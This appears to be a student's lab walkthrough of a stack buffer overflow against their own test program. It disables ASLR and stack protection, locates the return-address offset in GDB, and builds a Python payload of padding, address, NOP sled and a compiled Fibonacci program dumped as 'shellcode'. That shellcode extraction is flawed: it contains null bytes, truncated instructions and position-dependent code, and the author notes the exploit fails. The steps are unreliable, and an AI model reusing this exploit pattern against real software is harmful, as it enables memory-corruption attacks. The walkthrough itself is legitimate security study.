1. disable ASLR:


$ sudo sysctl kernel.randomize_va_space=0 

We disable also the debugging of the segmentation fault:

$ sudo sysctl -w debug.exception-trace=0

2. Compile program

$ gcc -fno-stack-protector -z execstack -o fibohack fibohack.c

3. Execute with GDB:

$ gdb fibohack

we turn into intel syntax:

$ set disassembly-flavor intel

then we look where the main function resides with:

$ disas main

and we create a breakpoint there with

$ break *main+25

then we run the code with a large chr, so with  run and then "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" as argument and when it stops we want to see where the stack resides:

$ x/32wx $rsp

and with the command "into frame " we see where the buffer breaks.

rip is located at: 0x7fffffffde18 and our buffer starts at 0x7fffffffddd0 which are 72 bytes of difference, therefore we need 72 bytes of padding to access the EIP.

4. Now we have to compile the code of fibonacci and convert it to shellcode:
Compile:
$ gcc -o fibonacci fibonacci.c
Now we will convert it into shellcode bytes

$ objdump -d ./fibonacci | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g' > bytes_fibo

6. We create the shellcode with the padding  in python to run the programme and run:

the adress will be the location of rip +4 bytes so 0x7fffffffde18 +4 bytes = 0x7fffffffde1c

python code:
########################################################
shellcode = "\x48\x83\xec\x08\x48\x8b\x05\xc5\x2f\x00\x48\x85\xc0\x74\x02\xff\xd0\x48\x83\xc4\x08\xc3\xff\x35\xca\x2f\x00\x00\xff\x25\xcc\x2f\x00\x00\x0f\x1f\x40\x00\xff\x25\xca\x2f\x00\x00\x68\x00\x00\x00\x00\xe9\xe0\xff\xff\xff\xff\x25\x9a\x2f\x00\x00\x66\x90\x31\xed\x49\x89\xd1\x5e\x48\x89\xe2\x48\x83\xe4\xf0\x50\x54\x45\x31\xc0\x31\xc9\x48\x8d\x3d\xb1\x01\x00\xff\x15\x4f\x2f\x00\x00\xf4\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x0f\x1f\x40\x00\x48\x8d\x3d\x91\x2f\x00\x48\x8d\x05\x8a\x2f\x00\x48\x39\xf8\x74\x15\x48\x8b\x05\x2e\x2f\x00\x48\x85\xc0\x74\x09\xff\xe0\x0f\x1f\x80\x00\x00\x00\xc3\x0f\x1f\x80\x00\x00\x00\x48\x8d\x3d\x61\x2f\x00\x48\x8d\x35\x5a\x2f\x00\x48\x29\xfe\x48\x89\xf0\x48\xc1\xee\x3f\x48\xc1\xf8\x03\x48\x01\xc6\x48\xd1\xfe\x74\x14\x48\x8b\x05\xfd\x2e\x00\x48\x85\xc0\x74\x08\xff\xe0\x66\x0f\x1f\x44\x00\x00\xc3\x0f\x1f\x80\x00\x00\x00\xf3\x0f\x1e\xfa\x80\x3d\x1d\x2f\x00\x00\x75\x2b\x55\x48\x83\x3d\xda\x2e\x00\x00\x48\x89\xe5\x74\x0c\x48\x8b\x3d\xfe\x2e\x00\xe8\x29\xff\xff\xff\xe8\x64\xff\xff\xff\xc6\x05\xf5\x2e\x00\x00\x5d\xc3\x0f\x1f\x00\xc3\x0f\x1f\x80\x00\x00\x00\xf3\x0f\x1e\xfa\xe9\x77\xff\xff\xff\x55\x48\x89\xe5\x53\x48\x83\xec\x38\x89\x7d\xcc\x48\x89\xe0\x48\x89\xc6\x8b\x45\xcc\x83\xc0\x02\x89\xc2\x48\x83\xea\x01\x48\x89\x55\xe0\x89\xc2\x49\x89\xd0\x41\xb9\x00\x00\x00\x00\x89\xc2\x48\x89\xd1\xbb\x00\x00\x00\x00\x89\xc0\x48\x8d\x14\xc5\x00\x00\x00\xb8\x10\x00\x00\x00\x48\x83\xe8\x01\x48\x01\xd0\xbb\x10\x00\x00\x00\xba\x00\x00\x00\x00\x48\xf7\xf3\x48\x6b\xc0\x10\x48\x29\xc4\x48\x89\xe0\x48\x83\xc0\x07\x48\xc1\xe8\x03\x48\xc1\xe0\x03\x48\x89\x45\xd8\x48\x8b\x45\xd8\x48\xc7\x00\x00\x00\x00\x48\x8b\x45\xd8\x48\xc7\x40\x08\x01\x00\x00\xc7\x45\xec\x02\x00\x00\xeb\x33\x8b\x45\xec\x8d\x50\xff\x48\x8b\x45\xd8\x89\xd2\x48\x8b\x14\xd0\x8b\x45\xec\x8d\x48\xfe\x48\x8b\x45\xd8\x89\xc9\x48\x8b\x04\xc8\x48\x8d\x0c\x02\x48\x8b\x45\xd8\x8b\x55\xec\x48\x89\x0c\xd0\x83\x45\xec\x01\x8b\x45\xec\x39\x45\xcc\x73\xc5\x48\x8b\x45\xd8\x8b\x55\xcc\x48\x8b\x04\xd0\x48\x89\xf4\x48\x8b\x5d\xf8\xc9\xc3\x55\x48\x89\xe5\x48\x83\xec\x10\xc7\x45\xfc\x0a\x00\x00\x8b\x45\xfc\x89\xc7\xe8\x04\xff\xff\xff\x48\x89\x45\xf0\x48\x8b\x55\xf0\x8b\x45\xfc\x89\xc6\x48\x8d\x05\xbf\x0d\x00\x48\x89\xc7\xb8\x00\x00\x00\x00\xe8\xda\xfd\xff\xff\xb8\x00\x00\x00\x00\xc9\xc3\x48\x83\xec\x08\x48\x83\xc4\x08\xc3" #shellcode for fibonacci.c
adress= ("\x1c\xde\xff\xff\xff\x7f")
nop = "\x90"
pad = "a"*72
all = pad+adress+nop*50+shellcode
print(all)

###########################################3

and to try to see if it works we must run:

$ python exploit_fibo.py | ./fibohack


#in my case it doesn't run and it must be due to a problem in the system





